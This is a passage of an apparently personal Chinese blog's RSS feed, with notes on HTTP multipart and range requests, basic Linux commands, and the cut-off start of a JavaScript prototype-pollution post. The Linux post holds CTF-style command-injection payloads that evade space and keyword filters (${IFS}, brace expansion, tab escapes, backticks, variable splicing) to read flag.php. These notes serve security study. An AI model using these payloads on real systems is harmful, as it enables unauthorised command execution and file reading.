data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token text-plain&#34;&gt;...（file1.txt的数据）...&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;--AaB03x--&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;strong&gt;multipart/byteranges&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight http&#34;&gt;&lt;figcaption data-lang=&#34;HTTP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token response-status&#34;&gt;&lt;span class=&#34;token http-version property&#34;&gt;HTTP/1.1&lt;/span&gt; &lt;span class=&#34;token status-code number&#34;&gt;206&lt;/span&gt; &lt;span class=&#34;token reason-phrase string&#34;&gt;Partial Content&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;Date&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;Fri, 13 Jul 2012 02:45:26 GMT&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;Last-Modified&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;Fri, 31 Aug 2007 02:02:20 GMT&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;Content-Type&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;multipart/byteranges; boundary=THIS_STRING_SEPARATES&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;--THIS_STRING_SEPARATES&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;Content-Type&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;application/pdf&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;Content-Range&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;bytes 500-999/8000&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;54&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;...（范围指定的数据）...&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;--THIS_STRING_SEPARATES&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;Content-Type&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;application/pdf&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;Content-Range&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;bytes 7000-7999/8000&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;...（范围指定的数据）...&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;--THIS_STRING_SEPARATES--&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;在 HTTP 报文中使用多部分对象集合时，需要在首部字段里加上 Content-type。&lt;strong&gt;使用 boundary 字符串&lt;/strong&gt;来划分多部分对象集合指明的各类实体。在&lt;strong&gt; boundary&lt;/strong&gt; 字符串指定的各个实体的起始行之前插入 “&lt;strong&gt;--&lt;/strong&gt;” 标记（例如：--AaB03x、--THIS_STRING_SEPARATES），而在多部分对象集合对应的字符串的最后插入 “&lt;strong&gt;--&lt;/strong&gt;” 标记（例如：-AaB03x--、--THIS_STRING_SEPARATES--）作为结束。&lt;/p&gt;
&lt;p&gt;多部分对象集合的每个部分类型中，都可以含有首部字段。另外，可&lt;br /&gt;
以在某个部分中嵌套使用多部分对象集合。有关多部分对象集合更详&lt;br /&gt;
细的解释，请参考 RFC2046。&lt;/p&gt;
&lt;h3 id=&#34;35-获取部分内容的范围请求&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#35-获取部分内容的范围请求&#34;&gt;#&lt;/a&gt; 3.5 获取部分内容的范围请求&lt;/h3&gt;
&lt;p&gt;为了解决传输过程中网络中断的情况，实现类似于断点续传的功能，使用 “范围请求 &amp;quot; 机制来实现。&lt;/p&gt;
&lt;p&gt;执行范围请求时，使用首部字段 Range。响应会返回状态码为 206Partial Content 的响应报文，另外对于多重范围请求的，响应会在首部字段 Content-Type  标明 multipart/byteranges。如果服务器无法响应范围请求则返回 200 OK 和完整的实体内容。&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;C:%5CUsers%5Clin%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20241006171019556.png&#34; alt=&#34;image-20241006171019556&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;byte 范围的指定形式:&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;5001~10 000 字节&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight http&#34;&gt;&lt;figcaption data-lang=&#34;HTTP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;Range&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;bytes=5001-10000&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;strong&gt;从 5001 字节之后全部的&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight http&#34;&gt;&lt;figcaption data-lang=&#34;HTTP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;Range&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;bytes=5001-&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;从一开始到 3000 字节和 5000~7000 字节的多重范围&lt;/p&gt;
&lt;figure class=&#34;highlight http&#34;&gt;&lt;figcaption data-lang=&#34;HTTP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;Range&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;bytes=-3000, 5000-7000&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h3 id=&#34;36-内容协商返回最合适的内容&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#36-内容协商返回最合适的内容&#34;&gt;#&lt;/a&gt; 3.6 内容协商返回最合适的内容&lt;/h3&gt;
&lt;p&gt;内容协商机制是指客户端和服务器端就响应的资源内容进行交涉，然后提供给客户端最为适合的资源。内容协商会以响应资源的语言、字符集、编码方式等作为判断的基准。&lt;/p&gt;
&lt;p&gt;相关字段主要有：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Accept&lt;/li&gt;
&lt;li&gt;Accept-Charset&lt;/li&gt;
&lt;li&gt;Accept-Encoding&lt;/li&gt;
&lt;li&gt;Accept-Language&lt;/li&gt;
&lt;li&gt;Content-Language&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;内容协商有 3 种类型：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;服务器驱动协商&lt;/strong&gt; (Server-driven Negotiation) 由服务器端进行内容协商。以请求的首部字段为参考，在服务器端自动处理。但对用户来说，以浏览器发送的信息作为判定的依据并不一定能筛选出最优内容。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;客户端驱动协商&lt;/strong&gt; (Agent-driven Negotiation) 由客户端进行内容协商的方式。用户从浏览器显示的可选项列表中手动选择。还可以利用 JavaScript 脚本在 web 页面上自动进行上述选择。比如按 OS 的类型或浏览器类型，自行切换成 PC 版页面或手机版页面。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;透明协商&lt;/strong&gt; (Transparent Negotiation) 是服务器驱动和客户端驱动的结合体，是由服务器端和客户端各自进行内容协商的一种方法&lt;/li&gt;
&lt;/ul&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://ly1tnt.github.io/2024/09/20/Linux/Linux%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4/</guid>
            <title>Linux基本命令</title>
            <link>https://ly1tnt.github.io/2024/09/20/Linux/Linux%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4/</link>
            <category term="Linux" scheme="https://ly1tnt.github.io/categories/Linux/" />
            <pubDate>Fri, 20 Sep 2024 18:47:30 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;linux基本命令&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#linux基本命令&#34;&gt;#&lt;/a&gt; Linux 基本命令&lt;/h1&gt;
&lt;h3 id=&#34;1查看文件&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#1查看文件&#34;&gt;#&lt;/a&gt; 1. 查看文件&lt;/h3&gt;
&lt;p&gt;1.cat&lt;/p&gt;
&lt;p&gt;2.od  Linux 系统中一个十六进制查看命令 可以查看文件文件或数据的内容&lt;/p&gt;
&lt;p&gt;3.more 类似 cat, 不过会以一页一页的形式显示。最基本的指令就是按空白键（space）就往下一页显示，按 b 键就会往回（back）一页显示&lt;/p&gt;
&lt;p&gt;4.xxd 将文件或数据转换为十六进制格式显示，类似于十六进制查看器。&lt;/p&gt;
&lt;p&gt;5.rev 反转并显示 它可以将指定文件或标准输入的每一行文本的字符顺序反转，然后输出到标准输出。&lt;/p&gt;
&lt;h3 id=&#34;2创建链接&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#2创建链接&#34;&gt;#&lt;/a&gt; 2. 创建链接&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;sudo ln -s&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;ex:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;ln&lt;/code&gt; ：创建链接的命令。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;-s&lt;/code&gt; ：表示创建的是&lt;strong&gt;符号链接&lt;/strong&gt;（软链接），而不是硬链接。符号链接类似于 Windows 的快捷方式，它指向目标文件，而不是复制该文件。&lt;/p&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;sudo&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;ln&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-s&lt;/span&gt; checksec /usr/local/bin/checksec&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;/usr/local/bin/checksec：这是符号链接的目标路径。符号链接将被创建在 /usr/local/bin 目录下，并命名为 checksec,/usr/local/bin 是系统默认的全局可执行文件路径之一，创建符号连接后可以直接通过命令行输入 &lt;code&gt; chechsec&lt;/code&gt;  执行&lt;/p&gt;
&lt;h3 id=&#34;3管道符命令&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#3管道符命令&#34;&gt;#&lt;/a&gt; 3. 管道符 | 命令&lt;/h3&gt;
&lt;p&gt;“|” 是 Linux 管道命令操作符，简称管道符。使用此管道符 “|” 可以将两个命令分隔开，“|” 左边命令的输出就会作为 “|” 右边命令的输入，此命令可连续使用，第一个命令的输出会作为第二个命令的输入，第二个命令的输出又会作为第三个命令的输入，依此类推。&lt;/p&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;cat&lt;/span&gt; hello.sh &lt;span class=&#34;token operator&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;sort&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;uniq&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;grep&lt;/span&gt; &#39;better’&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h4 id=&#34;4多命令顺序执行&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#4多命令顺序执行&#34;&gt;#&lt;/a&gt; 4. 多命令顺序执行&lt;/h4&gt;
&lt;p&gt;&lt;strong&gt;;&lt;/strong&gt; 分割每一个命令&lt;/p&gt;
&lt;p&gt;** 格式:** 命令；命令 2&lt;/p&gt;
&lt;p&gt;作用：多命令依次执行，命令之间没有逻辑关系。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&amp;amp;&amp;amp;&lt;/strong&gt;  逻辑与&lt;/p&gt;
&lt;p&gt;** 格式:** 命令 &amp;amp;&amp;amp; 命令 2&lt;/p&gt;
&lt;p&gt;作用：当命令 1 正确执行，则命令 2 才会执行。当命令 1 执行不正确，命令 2 不会执行。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;||&lt;/strong&gt;  逻辑或&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;格式&lt;/strong&gt;：格式：命令 1 || 命令 2&lt;/p&gt;
&lt;p&gt;作用：当命令 1 执行不正确，这命令 2 执行。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&amp;amp;&lt;/strong&gt; 将任务置于后台执行 (前面和后面命令都要执行，无论前面真假？搜索到的结果不一样)&lt;/p&gt;
&lt;h3 id=&#34;4命令绕过空格&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#4命令绕过空格&#34;&gt;#&lt;/a&gt; 4. 命令绕过空格&lt;/h3&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$&amp;#123;&lt;span class=&#34;token environment constant&#34;&gt;IFS&lt;/span&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$9&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;span class=&#34;token environment constant&#34;&gt;IFS&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token environment constant&#34;&gt;$IFS&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$&amp;#123;&lt;span class=&#34;token environment constant&#34;&gt;IFS&lt;/span&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token environment constant&#34;&gt;$IFS&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$1&lt;/span&gt; //&lt;span class=&#34;token variable&#34;&gt;$1&lt;/span&gt;改成$加其他数字貌似都行&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token environment constant&#34;&gt;IFS&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;lt;&gt;&lt;/span&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;cat,flag.php&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;  //用逗号实现了空格功能，需要用&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;括起来&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;%20   &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;space&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;%09   &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;tab&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token assign-left variable&#34;&gt;X&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;$&#39;cat&lt;span class=&#34;token entity&#34; title=&#34;\x09&#34;&gt;\x09&lt;/span&gt;./flag.php&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$X&lt;/span&gt;       （&lt;span class=&#34;token punctuation&#34;&gt;\&lt;/span&gt;x09表示tab，也可以用&lt;span class=&#34;token punctuation&#34;&gt;\&lt;/span&gt;x20）&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h3 id=&#34;5grep命令&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#5grep命令&#34;&gt;#&lt;/a&gt; 5.grep 命令&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-linux&#34;&gt;grep [options] pattern [files]
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;在文件 file.txt 中查找字符串 &amp;quot;hello&amp;quot;，并打印匹配的行：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;grep hello file.txt&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&#34;6内联使用&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#6内联使用&#34;&gt;#&lt;/a&gt; 6. 内联使用&lt;/h3&gt;
&lt;h4 id=&#34;绕过&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#绕过&#34;&gt;#&lt;/a&gt; `` 绕过&lt;/h4&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;cat&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;&lt;span class=&#34;token variable&#34;&gt;`&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;ls&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;grep&lt;/span&gt; fla&lt;span class=&#34;token variable&#34;&gt;`&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h3 id=&#34;7内联执行绕过&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#7内联执行绕过&#34;&gt;#&lt;/a&gt; 7. 内联执行绕过&lt;/h3&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token assign-left variable&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;c&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token assign-left variable&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;a&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token assign-left variable&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;t&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$a&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$b&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$c&lt;/span&gt; /1.txt&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token assign-left variable&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;f&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token assign-left variable&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;a&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token assign-left variable&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;g&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token assign-left variable&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;l&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;cat&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$a&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$b&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$c&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$d&lt;/span&gt;.php（abcd拼接出来flag）&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt; ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://ly1tnt.github.io/2024/09/20/CTF/Web/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/</guid>
            <title>JS原型链污染</title>
            <link>https://ly1tnt.github.io/2024/09/20/CTF/Web/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/</link>
            <category term="CTF" scheme="https://ly1tnt.github.io/categories/CTF/" />
            <category term="Web" scheme="https://ly1tnt.github.io/categories/CTF/Web/" />
            <pubDate>Fri, 20 Sep 2024 18:47:30 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;原型链污染&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#原型链污染&#34;&gt;#&lt;/a&gt; 原型链污染&lt;/h1&gt;
&lt;p&gt;原型链污染（Prototype Pollution）是一种 web 应用程序中常见的安全漏洞，主要影响使用 JavaScript 的应用程序。它是一种攻击技术，通过修改 JavaScript 对象的原型链，来实现对应用程序的非法操作和控制。&lt;/p&gt;
&lt;p&gt;JavaScript 中的对象是通过&lt;strong&gt;原型链进行继承的&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;每个对象都有一个指向其原型的链接，它允许对象从其原型中继承属性和方法。当 JavaScript 代码在处理输入时，如果不适当地允许用户控制原型链上的属性，攻击者就可以操纵原型链，并在目标对象上添加、修改或删除属性。&lt;/p&gt;
&lt;figure class=&#34;highlight javascript&#34;&gt;&lt;figcaption data-lang=&#34;javascript&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;// 创建一个构造函数&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;Person&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token parameter&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token 